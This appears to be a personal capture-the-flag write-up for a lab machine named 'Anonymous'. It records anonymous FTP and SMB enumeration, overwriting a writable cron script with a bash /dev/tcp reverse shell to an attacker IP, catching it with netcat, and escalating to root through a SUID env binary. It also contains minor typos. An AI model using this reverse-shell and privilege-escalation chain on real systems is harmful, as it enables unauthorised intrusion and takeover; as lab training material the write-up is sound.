# Anonymous

![image.png](image%207.png)

21  FTP
22  SSH
139/445  SMB (Samba)

1. FTP (anonymous?)
2. SMB (enum4linux)
3. Reuse creds → SSH

1 _ FTP often allows **anonymous login port 21 (vsftpd 2.0.8)**

```bash
ftp 10.67.145.253

```

tried anonymous for the username and left it blank for the password , that failed

2 _ SSH - Port 22

    SSH is NOT exploitable by itself yet

3 _ SMB often leaks users, shares, and sometimes passwords Ports 139 & 445

Your instinct to run `enum4linux`

```bash
enum4linux -a @Ip
```

## ✅ 1. Anonymous SMB access is ALLOWED

```
[+]Server allows sessionsusing username'',password''

```

## ✅ 2. A REAL user exists: `namelessone`

```
user:[namelessone]
UnixUser\namelessone

```

### Reflex:

> A real user = future SSH login candidate
> 

## ✅ 3. A readable SMB share exists: `pics`

```
picsDiskMySMBShareDirectoryforPics
Listing:OK
Writing:N/A

```

### This is HUGE.

Your reflex should be:

> “Readable share = information leak”
> 

## ✅ 4. Password policy is weak

```
Minimum length:5
Complexity:Disabled

```

 

next

```bash
smbclient //10.67.145.253/pics -N

```

found two imgs corgo.jpg and puppos.jrpf

run 

```bash
exiftool puppos.jpeg
exiftool corgo.jpg

```

nothing found

then 

connect to ftp anonymously

```bash
 $ ftp 10.67.145.253

Connected to 10.67.145.253.
220 NamelessOne's FTP Server!
Name (10.67.145.253:ayachi): anonymous
331 Please specify the password.
Password: 
230 Login successful.

```

then under directory scripts

```bash
-rwxr-xrwx    1 1000     1000          314 Jun 04  2020 clean.sh
-rw-rw-r--    1 1000     1000         2838 Dec 26 11:36 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12  2020 to_do.txt

```

get them

```bash
get filename
```

i suspected that [clean.sh](http://clean.sh) is excuted by a cron , i changed to code to redirect the output 

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
    id >> /var/ftp/scripts/r.log
else
    ...
fi

```

connect to ftp again and 

```bash
put clean.sh
```

that upload the file

then get the r.log

its confiermed it excuted by cron job 

igot this 

uid=1000(namelessone) gid=1000(namelessone) groups=1000(namelessone),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lxd)

change [clean.sh](http://clean.sh) 

```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
   sh -i >& /dev/tcp/192.168.202.127/9001 0>&1
else
    ...
fi
```

set up the listener

```bash
nc -lvnp 9001
```

were are connected to namelessone shell

shell shell stabilization

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
export TERM=xterm

```

```bash
find / -type f -perm 4000 2>/dev/null 
```

i found /usr/bin/env

go to GTFOBins

found this command for privilege escalation

```bash
/usr/bin/pkexec
namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
bash-4.4# cat /root/root.txt
4d930091c31a622a7ed10f27999af363
bash-4.4# 

```

!!!!! we are root now

just execute

```bash
cat /root/root.txt
```

flag found